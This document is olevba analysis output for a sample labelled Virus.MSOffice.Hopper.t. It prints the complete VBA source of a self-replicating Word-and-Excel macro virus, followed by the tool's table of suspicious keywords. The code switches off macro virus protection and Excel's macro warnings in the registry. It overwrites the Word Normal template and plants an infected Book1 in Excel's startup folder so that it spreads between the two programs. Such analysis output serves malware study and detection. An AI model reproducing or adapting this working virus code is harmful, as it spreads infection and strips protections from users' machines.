olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Cross.BadSeed vT.1
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
        End If
        xlApp.Quit
    End If
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """"" + Chr(13) + Chr(10) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """"" + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

